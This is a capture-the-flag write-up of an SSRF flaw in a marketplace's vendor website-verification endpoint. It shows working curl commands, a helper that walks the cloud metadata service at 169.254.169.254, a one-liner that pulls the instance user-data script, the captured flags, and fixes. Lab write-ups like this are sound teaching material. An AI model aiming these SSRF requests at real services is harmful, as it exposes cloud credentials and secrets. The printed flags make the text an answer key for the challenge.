---
title: "Marketplace — Vendor Verification SSRF (IMDS user-data Leak)"
ctf: "riffhack"
date: 2026-06-19
category: web
difficulty: easy
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace — Vendor Verification SSRF (IMDS user-data Leak)

> "Vendors must prove their legitimacy to join the marketplace. Some have discovered the verification process can peek into places it shouldn't. What secrets lie behind the check?"
> Target: `http://147.182.217.186/`

## Summary

`POST /api/vendor/verify-website` accepts `{"website": <url>}`, server-fetches the URL with no host filter, and reflects the response body back in `body`. Pointed at the instance-metadata service (`http://169.254.169.254/`), the endpoint reveals the IMDS tree. Two interesting leaves exist:

- `…/iam/security-credentials/RiffhackVendorVerifierRole` — a planted IAM role document whose session `Token` carries a decoy bitflag.
- `…/user-data` — the actual instance boot script, which exports `TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}`.

The challenge wants the **user-data** flag. The IAM token field is a misdirection planted to soak up the obvious AWS-style SSRF reflex.

## Recon

The vendor-application client chunk shows the call shape:

```js
fetch("/api/vendor/verify-website", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ website: e.website })
})
```

Reflection confirmed:

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"website":"http://example.com"}' \
  http://147.182.217.186/api/vendor/verify-website
# → {"success":true,"message":"Website verification successful","body":"<!doctype html>..."}
```

The presence of `body` in the response is the textbook SSRF-with-reflection signal.

## Exploit

### Step 1: Walk the IMDS tree

```bash
H=http://147.182.217.186
hit() {
  curl -s -X POST -H 'Content-Type: application/json' \
    --data "{\"website\":\"$1\"}" "$H/api/vendor/verify-website" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["body"])'
}

hit 'http://169.254.169.254/latest/meta-data/'
# instance-id
# hostname
# iam/security-credentials/
# placement/region
```

Two interesting leaves were reachable:

- `latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole` — IAM role doc.
- `latest/user-data` — boot-time user-data script.

### Step 2: Read the user-data boot script

```bash
hit 'http://169.254.169.254/latest/user-data'
```

Output:

```
#!/bin/sh
export MARKETPLACE_ENV=ctf
export TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}
node server.js
```

One-liner:

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"website":"http://169.254.169.254/latest/user-data"}' \
  http://147.182.217.186/api/vendor/verify-website \
  | python3 -c "import sys,json,re;print(re.search(r'bitflag\{[^}]+\}', json.load(sys.stdin)['body']).group(0))"
```

## Why it works

- **No URL allowlist.** The handler accepts any `website` URL, including link-local `169.254.169.254` (the AWS-style instance-metadata endpoint).
- **Body reflection.** The fetched response body is returned to the caller as `body`, turning the SSRF into a direct data exfiltration channel.
- **Cloud-init exposure.** EC2-style instances often store secrets in their `user-data` boot script. Anyone who can reach IMDS can read them — and a `verify-website` helper that runs on the same instance can definitely reach IMDS.
- **Decoy.** The IAM role document's session `Token` field has a planted bitflag (`w3bs0ck3t_upgr4d3_ssrf_2026`) to bait solvers who stop at the first AWS-credentials hit. The intended path is to keep walking and read `user-data`.

## Fix

- Block `169.254.0.0/16`, RFC1918, loopback, and other link-local ranges in the URL before fetching.
- Maintain an explicit allowlist of acceptable vendor-website hosts.
- Migrate to IMDSv2 (require `x-aws-ec2-metadata-token`) so a naive HTTP GET cannot reach the metadata endpoint.
- Never put secrets in `user-data` — use a secrets manager + runtime injection instead.
- Strip `body` from the client-facing response; return a boolean status only.

## Flag

```
bitflag{ssrf_1s_4_p4rty_cr4sh3r}
```
